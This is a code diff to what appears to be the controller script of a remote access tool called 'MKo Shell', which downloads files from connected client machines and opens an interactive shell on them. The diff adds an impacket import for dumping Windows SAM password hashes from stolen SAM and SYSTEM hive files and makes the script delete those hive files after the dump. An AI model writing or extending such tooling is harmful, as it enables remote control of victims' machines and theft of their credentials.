@@ -2,6 +2,7 @@ import os
 import random
 
 import pyfiglet
+from impacket.examples.secretsdump import LocalOperations, SAMHashes
 
 
 def print_help_client():
@@ -149,7 +150,6 @@ def print_progress(progress, nbr_of_dot):
 def download_file(file_path, conn):
     filename, file_path = format_filename(file_path)
 
-
     # check if Download folder exists
     if not os.path.exists("Downloads"):
         os.makedirs("Downloads")
@@ -163,7 +163,7 @@ def download_file(file_path, conn):
     else:
         # receive the file size
         file_size = int.from_bytes(conn.recv(8), 'big')
-        # print(f"Expected file size: {file_size} bytes")
+        print(f"Expected file size: {file_size} bytes")
 
         # receive the file
         random_str = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8)) + "_"
@@ -183,6 +183,8 @@ def download_file(file_path, conn):
                 nbr_of_dot = print_progress(progress, nbr_of_dot)
 
         return download_path
+
+
 def interact_shell(conn, client_id):
     print(f"MKo Shell (client {client_id}) > ", end="")
     conn.send("shell".encode('utf-8'))
@@ -219,6 +221,7 @@ def format_filename(commande):
     else:
         return file_path, file_path
 
+
 def secret_dump_from_file(sam_path, system_path):
     try:
         # Initialize LocalOperations class
@@ -229,6 +232,10 @@ def secret_dump_from_file(sam_path, system_path):
         sam_hashes = SAMHashes(sam_path, boot_key, isRemote=False)
         sam_hashes.dump()
         sam_hashes.export('Downloads/sam_hashes')
+
+        # delete same & system file
+        os.remove(sam_path)
+        os.remove(system_path)
 
         print("Dump completed successfully.")
 
